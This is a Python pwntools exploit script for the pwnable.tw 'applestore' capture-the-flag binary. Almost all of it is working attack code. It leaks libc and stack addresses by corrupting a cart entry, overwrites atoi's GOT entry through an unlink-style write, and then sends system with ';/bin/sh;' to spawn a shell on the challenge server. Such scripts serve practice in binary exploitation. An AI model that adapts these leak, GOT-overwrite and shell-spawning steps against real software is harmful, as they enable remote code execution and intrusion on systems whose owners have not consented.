#!/home/thomason/.virtualenv/pwnshop/bin/python

from pwn import *


context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "chall.pwnable.tw"
PORT = 10104
LOCAL = True
challenge = "./applestore"
elf = ELF(challenge, checksec=False)
libc = ELF(elf.libc.path, checksec=False)
# libc = ELF("./libc_32.so.6", checksec=False)

if LOCAL:
    # p = process(elf.file.name)
    # gdb.attach(p, """
    #         """)
    p = gdb.debug(elf.file.name, """
            b *0x80489fd
            c
            """)
else:
    context.log_level = "info"
    p = remote(HOST, PORT)

# Exploit starts here
def add(idx):
    ru("> ")
    sl(str(2))
    ru("> ")
    sl(str(idx))

def remove(item_num):
    ru("> ")
    sl(str(3))
    ru("> ")
    sl(item_num)

def checkout():
    ru("> ")
    sl(str(5))
    ru("> ")
    sl('y')

for i in range(6):
    add(1)
for i in range(20):
    add(2)
checkout()

# Leak
atoi = 0x804b040
remove(b"27" + p32(atoi) + b"\0" * 0x10)
ru("27:")
leak = u32(r(4))
libc.address = leak - libc.symbols[b"atoi"]
print("[COMPUTE] LIBC ADDR: ", hex(libc.address))

remove(b"27" + p32(libc.symbols[b"environ"]) + b"\0" * 0x10)
ru("27:")
leak = u32(r(4))
ebp = leak - 0x104
print("[COMPUTE] EBP ADDR: ", hex(ebp))

# remove(b"27"+p32(0x0804b000)+p32(0xdeadbeef)+p32(ebp-12)+p32(atoi+0x22)+b'\n')
remove(b"27" + p32(atoi) + b"\0" * 0x4 + p32(ebp - 0xc) + p32(atoi + 0x22))
ru("> ")
sl(p32(libc.symbols["system"]) + b";/bin/sh;")

p.interactive()

